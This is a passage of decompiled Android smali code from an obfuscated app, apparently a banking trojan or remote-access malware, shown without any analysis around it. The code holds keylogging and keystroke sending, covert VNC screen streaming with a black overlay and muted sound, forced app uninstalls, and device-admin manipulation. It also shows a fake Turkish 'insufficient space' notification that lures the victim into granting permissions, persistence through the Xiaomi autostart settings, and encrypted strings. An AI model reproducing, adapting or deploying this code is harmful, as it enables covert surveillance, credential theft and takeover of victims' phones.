    invoke-virtual {v5}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    if-eqz v6, :cond_2

    goto :goto_2

    :cond_2
    invoke-static {p0, v5, v2}, Lcom/beginhigh19/p054v;->class(Landroid/content/Context;Ljava/lang/String;Ljava/util/HashSet;)Z

    move-result v6

    if-eqz v6, :cond_3

    invoke-static {p0, v5}, Lfddo/goto;->v(Landroid/content/Context;Ljava/lang/String;)V

    const-string p1, "5fa1c64803ddf3ed64"

    invoke-static {p1}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "confirm_uninstall"

    invoke-static {p0, p1, v0}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1

    const-string v0, "last_uninstall_attempt"

    invoke-static {p0, v0, p1}, Lfddo/throw;->goto(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)V

    goto :goto_3

    :cond_3
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v7, ""

    invoke-virtual {p1, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1, v5, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    const-string v5, "uninstall_apps"

    invoke-static {p0, v5, p1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :goto_2
    add-int/lit8 v4, v4, 0x1

    goto :goto_1

    :cond_4
    :goto_3
    return-void
.end method

.method private new(Landroid/content/Context;)V
    .locals 3

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v1, "kill_bot"

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v1, "device_admin_set"

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/beginhigh19/p053u;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->removeActiveAdmin(Landroid/content/ComponentName;)V

    const-string v0, "acsb_task"

    const-string v1, "admin"

    invoke-static {p1, v0, v1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Lfddo/goto;->p(J)V

    :cond_1
    :goto_0
    return-void
.end method

.method private public(Landroid/content/Context;)V
    .locals 6

    const-string v0, "acsb_task"

    const-string v1, ""

    invoke-static {p1, v0, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "confirm_uninstall"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const/4 v3, 0x0

    if-eqz v2, :cond_0

    const/4 v2, 0x1

    const/16 v4, 0xa

    const-string v5, "last_uninstall_attempt"

    invoke-static {p1, v5, v4, v3}, Lfddo/goto;->dkgmhapefdmhpadfmhspfkgmh(Landroid/content/Context;Ljava/lang/String;IZ)Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-static {p1, v0, v1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    move v2, v3

    :cond_1
    if-nez v2, :cond_2

    invoke-static {p1}, Lfddo/goto;->apdmghpaiodfmhpadfmhpdmfkh(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_2

    const-string v0, "uninstall_apps"

    invoke-static {p1, v0, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "uninstall_delay"

    invoke-static {p1, v2, v1}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    const-wide/16 v2, 0x0

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    const-string v3, "uptime"

    invoke-static {p1, v3, v2}, Lfddo/throw;->for(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Long;->longValue()J

    move-result-wide v2

    int-to-long v4, v1

    cmp-long v1, v2, v4

    if-lez v1, :cond_2

    invoke-static {p1, v0}, Lcom/beginhigh19/p054v;->native(Landroid/content/Context;Ljava/lang/String;)V

    :cond_2
    return-void
.end method

.method private return(Landroid/content/Context;)V
    .locals 5

    const/4 v0, -0x1

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "panel_smarts_ver"

    invoke-static {p1, v2, v1}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    const-string v3, "bot_smarts_ver"

    invoke-static {p1, v3, v1}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    const/4 v3, 0x1

    if-ne v2, v0, :cond_0

    if-ne v1, v0, :cond_0

    const/16 v0, 0x1e

    const-string v4, "smarts_last_download_ts"

    invoke-static {p1, v4, v0}, Lfddo/goto;->sdgphkmaepghmsdpgfmhapdfmgh(Landroid/content/Context;Ljava/lang/String;I)Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v3

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    if-le v2, v1, :cond_1

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "bot_smarts"

    invoke-static {p1, v1, v0}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    goto :goto_1

    :cond_1
    move v3, v0

    :goto_1
    if-eqz v3, :cond_2

    new-instance v0, Lfddo/class;

    invoke-direct {v0, p1}, Lfddo/class;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lfddo/class;->for()V

    :cond_2
    return-void
.end method

.method private static(Landroid/content/Context;)V
    .locals 4

    const-wide/16 v0, 0x0

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    const-string v3, "registration_time"

    invoke-static {p1, v3, v2}, Lfddo/throw;->for(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Long;->longValue()J

    move-result-wide v2

    cmp-long v0, v2, v0

    if-eqz v0, :cond_0

    invoke-static {}, Lfddo/goto;->continue()J

    move-result-wide v0

    sub-long/2addr v0, v2

    iput-wide v0, p0, Lcom/beginhigh19/p054v;->fddo:J

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    const-string v1, "uptime"

    invoke-static {p1, v1, v0}, Lfddo/throw;->goto(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)V

    :cond_0
    return-void
.end method

.method private super(Landroid/content/Context;Ljava/lang/String;)V
    .locals 7

    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    const-string v1, "vnc_overlay_enabled"

    const-string v2, "vnc_backlight_off"

    const-string v3, "vnc_sound_off"

    const-string v4, "screen_timeout_increased"

    const-string v5, "vnc_stream_started"

    if-eqz v0, :cond_5

    sget-object p2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v1, p2}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {p1}, Lfddo/goto;->b(Landroid/content/Context;)V

    invoke-static {p1, v1, p2}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_0
    invoke-static {p1, v5, p2}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/beginhigh19/p067x;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "stop"

    const-string v6, "1"

    invoke-virtual {v0, v1, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-static {p1, v0}, Lfddo/goto;->s(Landroid/content/Context;Landroid/content/Intent;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/beginhigh19/p044i;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    invoke-static {p1, v5, p2}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_1
    invoke-static {p1, v3, p2}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-static {p1}, Lfddo/goto;->ifdf(Landroid/content/Context;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-static {p1}, Lfddo/goto;->break(Landroid/content/Context;)V

    invoke-static {p1, v3, p2}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_2
    invoke-static {p1, v2, p2}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-static {p1}, Lfddo/goto;->else(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-static {p1}, Lfddo/goto;->c(Landroid/content/Context;)V

    invoke-static {p1, v2, p2}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_3
    invoke-static {p1}, Lfddo/goto;->else(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_4

    invoke-static {p1, v4, p2}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_4

    invoke-static {p1}, Lfddo/goto;->d(Landroid/content/Context;)V

    invoke-static {p1, v4, p2}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_4
    return-void

    :cond_5
    invoke-static {p1}, Lfddo/goto;->else(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_6

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v4, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_6

    invoke-static {p1}, Lfddo/goto;->dgjfsdhadfjhadfh(Landroid/content/Context;)V

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v4, v0}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_6
    const-string v0, "STREAM_SCREEN;"

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_7

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v5, v4}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v6

    if-eqz v6, :cond_7

    sget-boolean v6, Lcom/beginhigh19/p067x;->this:Z

    if-nez v6, :cond_7

    invoke-static {p1, v5, v4}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_7
    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_8

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v5, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_8

    invoke-static {p1}, Lfddo/goto;->apdmghpaiodfmhpadfmhpdmfkh(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_8

    const/16 v0, 0x1e

    const/4 v4, 0x1

    const-string v5, "last_vnc_stream_attempt"

    invoke-static {p1, v5, v0, v4}, Lfddo/goto;->dkgmhapefdmhpadfmhspfkgmh(Landroid/content/Context;Ljava/lang/String;IZ)Z

    move-result v0

    if-eqz v0, :cond_8

    const-string v0, "acsb_task"

    const-string v4, "vnc_screen"

    invoke-static {p1, v0, v4}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-class v4, Lcom/beginhigh19/p036n;

    invoke-direct {v0, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v4, 0x10000000

    invoke-virtual {v0, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/app/Service;->startActivity(Landroid/content/Intent;)V

    :cond_8
    const-string v0, "BLACK;"

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_9

    invoke-static {p1}, Lfddo/goto;->jghkmjpdokgmhsdghkmdg(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_9

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_9

    invoke-static {p1}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_9

    invoke-static {p1}, Lfddo/goto;->for(Landroid/content/Context;)V

    :cond_9
    const-string v0, "SILENT;"

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-eqz p2, :cond_b

    sget-object p2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v3, p2}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_a

    invoke-static {p1}, Lfddo/goto;->ifdf(Landroid/content/Context;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_a

    invoke-static {p1}, Lfddo/goto;->catch(Landroid/content/Context;)V

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v3, v0}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_a
    invoke-static {p1, v2, p2}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-nez p2, :cond_b

    invoke-static {p1}, Lfddo/goto;->else(Landroid/content/Context;)Z

    move-result p2

    if-eqz p2, :cond_b

    invoke-static {p1}, Lfddo/goto;->this(Landroid/content/Context;)V

    sget-object p2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v2, p2}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_b
    return-void
.end method

.method private this(Landroid/content/Context;)V
    .locals 5

    const-class v0, Lcom/beginhigh19/p025i;

    sget v1, Lfddo/goto;->ifdf:I

    sget v2, Lfddo/goto;->new:I

    if-ge v1, v2, :cond_0

    return-void

    :cond_0
    const-string v1, "vnc"

    const-string v2, ""

    invoke-static {p1, v1, v2}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_1

    return-void

    :cond_1
    const/4 v1, 0x5

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "perms_check_delay"

    invoke-static {p1, v3, v2}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    invoke-static {p1}, Lfddo/goto;->apdmghpaiodfmhpadfmhpdmfkh(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_3

    const-string v3, "last_perms_check"

    const/4 v4, 0x1

    invoke-static {p1, v3, v2, v4}, Lfddo/goto;->dkgmhapefdmhpadfmhspfkgmh(Landroid/content/Context;Ljava/lang/String;IZ)Z

    move-result v2

    if-eqz v2, :cond_3

    const-string v2, "5fa1c64803ddf3ed64"

    invoke-static {v2}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "perms"

    invoke-static {p1, v2, v3}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "check_perms_attempts"

    invoke-static {p1, v3, v2}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    add-int/2addr v2, v4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {p1, v3, v4}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    if-le v2, v1, :cond_2

    const/16 v1, 0xa

    if-ge v2, v1, :cond_2

    const-string v1, "Yetersiz alan!"

    const-string v2, "Temizlemek i\u00e7in buraya tiklayin"

    invoke-static {p1, v1, v2, v0}, Lfddo/goto;->n(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Class;)V

    :cond_2
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    invoke-virtual {v1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x20000000

    invoke-virtual {v1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Lfddo/goto;->p(J)V

    :cond_3
    return-void
.end method

.method private throw(Landroid/content/Context;)V
    .locals 3

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v1, "keylogger_enabled"

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    const-string v0, "last_keylog_send"

    const/4 v1, 0x5

    invoke-static {p1, v0, v1}, Lfddo/goto;->sdgphkmaepghmsdpgfmhapdfmgh(Landroid/content/Context;Ljava/lang/String;I)Z

    move-result v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    invoke-static {p1}, Lfddo/goto;->fgjagthj(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v2

    if-le v2, v1, :cond_2

    invoke-static {p1, v0}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    :cond_2
    return-void
.end method

.method private while(Landroid/content/Context;)V
    .locals 0

    invoke-static {p1, p0}, Lcom/beginhigh19/p041i;->fddo(Landroid/content/Context;Landroid/app/Service;)V

    invoke-static {p1}, Lcom/beginhigh19/p041i;->for(Landroid/content/Context;)V

    const/4 p1, 0x1

    sput-boolean p1, Lcom/beginhigh19/p054v;->for:Z

    return-void
.end method


# virtual methods
.method public else(Landroid/content/Context;)Z
    .locals 7

    const-string v0, "vnc"

    const-string v1, ""

    invoke-static {p1, v0, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    const/4 v2, 0x1

    if-nez v0, :cond_0

    return v2

    :cond_0
    invoke-static {}, Lfddo/goto;->grethwjrsfhj()Z

    move-result v0

    if-nez v0, :cond_1

    return v2

    :cond_1
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    new-instance v3, Landroid/content/ComponentName;

    const-string v4, "com.miui.securitycenter"

    const-string v5, "com.miui.permcenter.autostart.AutoStartManagementActivity"

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0}, Landroid/app/Service;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    const/high16 v4, 0x10000

    invoke-virtual {v3, v0, v4}, Landroid/content/pm/PackageManager;->resolveActivity(Landroid/content/Intent;I)Landroid/content/pm/ResolveInfo;

    move-result-object v3

    if-nez v3, :cond_2

    return v2

    :cond_2
    const-string v3, "xiaomi_autostart"

    invoke-static {p1, v3, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_4

    const/16 v1, 0x3c

    const-string v4, "last_autostart_attempt"

    invoke-static {p1, v4, v1, v2}, Lfddo/goto;->dkgmhapefdmhpadfmhspfkgmh(Landroid/content/Context;Ljava/lang/String;IZ)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "xiaomi_autostart_attempts"

    invoke-static {p1, v5, v4}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    const/4 v6, 0x4

    if-ge v4, v6, :cond_4

    const/high16 v4, 0x10000000

    invoke-virtual {v0, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-string v0, "5fa1c64803ddf3ed64"

    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v3}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {p1, v5, v0}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    add-int/2addr v0, v2

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {p1, v5, v0}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    sget-object p1, Lfddo/for;->ifdf:Ljava/lang/String;

    const-string v0, "MANPERMS"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_3

    const-wide/32 v2, 0xea60

    :goto_0
    invoke-static {v2, v3}, Lfddo/goto;->p(J)V

    return v1

    :cond_3
    const-wide/16 v2, 0x1388

    goto :goto_0

    :cond_4
    return v2
.end method

.method public goto(Landroid/content/Context;)Z
    .locals 11

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v1, "device_admin_set"

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    return v1

    :cond_0
    const-string v0, "5fa6d84332f6f3ea7b36b22d437d"

    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {p1, v2, v4}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    const-string v4, "admin"

    const/16 v5, 0xa

    const-string v6, "5fa1c64803ddf3ed64"

    if-lt v2, v5, :cond_3

    invoke-static {v6}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, ""

    invoke-static {p1, v0, v3}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

